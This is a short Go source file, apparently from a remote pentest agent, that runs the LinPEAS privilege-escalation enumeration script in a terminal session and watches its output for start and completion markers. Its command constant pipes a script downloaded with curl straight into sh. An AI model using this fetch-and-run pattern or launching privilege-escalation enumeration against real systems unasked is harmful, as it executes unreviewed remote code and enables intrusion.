package action

import (
	"fmt"
	"strings"

	"github.com/thecoderstudio/apollo-agent/logging"
	"github.com/thecoderstudio/apollo-agent/pty"
)

const initialisationIndication = "ADVISORY"
const completionIndication = "linPEAS done"
const commandFormat = "curl https://raw.githubusercontent.com/carlospolop/" +
	"privilege-escalation-awesome-scripts-suite/master/linPEAS/" +
	"linpeas.sh | sh && echo '%s\n'\n"

// LinPeas allows for the execution of LinPEAS. LinPEAS is a script
// to search for possible local privilege escalation paths
// https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
type LinPeas struct {
	Session *pty.Session
}

// Run runs LinPEAS on the machine
func (linPeas LinPeas) Run() {
	go linPeas.waitForCompletion()
	go linPeas.Session.Execute(
		fmt.Sprintf(commandFormat, completionIndication),
	)
}

func (linPeas LinPeas) waitForCompletion() {
	linPeas.waitForInitialisation()
	for {
		if linPeas.outputContains(completionIndication) {
			logging.Critical("DONEE")
		}
	}
}

func (linPeas LinPeas) waitForInitialisation() {
	for {
		if linPeas.outputContains(initialisationIndication) {
			logging.Critical("init")
			return
		}
	}
}

func (linPeas LinPeas) outputContains(substring string) bool {
	output := <-linPeas.Session.Out()
	return strings.Contains(output.Message, substring)
}
